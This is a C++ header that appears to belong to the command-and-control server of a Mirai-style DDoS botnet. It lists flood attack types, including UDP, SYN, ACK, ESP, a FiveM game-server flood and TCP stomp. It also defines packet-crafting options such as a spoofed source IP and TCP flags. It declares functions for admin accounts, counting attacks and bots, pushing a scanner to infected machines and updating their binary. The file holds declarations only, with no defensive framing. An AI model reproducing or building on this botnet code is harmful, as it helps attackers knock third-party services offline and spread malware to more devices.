#pragma once

#include <fcntl.h>
#include <string>

#include "main.h"

enum
{
    FLOOD_UDPPLAIN = 1,
    FLOOD_SYNPLAIN = 2,
    FLOOD_ACKPLAIN = 3,
    FLOOD_UDPBYPASS = 4,
    FLOOD_SYNACK = 7,
	FLOOD_UDPESP = 9,
	FLOOD_UDPHEX = 8,
	FLOOD_UDPFIVEM = 6,
	FLOOD_TCPSTOMP = 5,
    OPT_PORT = 1,
    OPT_SIZE = 2,
    OPT_THREAD_COUNT = 3,
    OPT_HTTP_PATH = 4,
    OPT_HTTP_CONNECTION = 5,
    OPT_DOMAIN = 6,
    OPT_TCP_TTL = 7,
	OPT_TCP_SOURCE_PORT = 8,
	OPT_TCP_ACK = 9,
	OPT_TCP_FIN = 10,
	OPT_TCP_URG = 11,
	OPT_TCP_PSH = 12,
	OPT_TCP_RST = 13,
	OPT_TCP_SYN = 14,
	OPT_TCP_TOS = 15,
	OPT_TCP_ID = 16,
	OPT_TCP_SEQUENCE = 17,
	OPT_TCP_SOURCE_IP = 18,
	OPT_TCP_ACK_SEQUENCE = 19,
	OPT_MAXPPS = 20,
	OPT_MINPPS = 21,
	OPT_MAXLEN = 22,
	OPT_MINLEN = 23,
	OPT_PAYLOAD = 24,
	OPT_BIND = 25,
	OPT_RAND = 26,
	OPT_PPS = 27,	
};

static int enable = 1;

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define REUSE_ADDR(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)))
#define PACKED __attribute__((packed))

int mysql_login(struct admin *);
void mysql_set_restrictions(struct admin *);
void mysql_update_login(struct admin *, int);
void mysql_update_disable(struct admin *, const char *, int);
void mysql_add_user(const char*, const char*, const int, const int, const int, const int, const int, const int, const int, const int, const char);
void mysql_remove_user(const char*);

void mysql_get_client_information(struct admin *);
void mysql_clear_login(void);
void mysql_log(std::string, int, std::string, std::string, uint16_t);
int mysql_allow_concurrent(int, std::string, uint16_t, int, int);
int mysql_attacks(int);

struct command *command_process(struct process *);
struct command *process_update(struct process *, uint8_t);

void push_scanner(struct process *, struct command *);
void update_binary(struct process *);

std::map<std::string, int> statistics(void);

int client_count(int);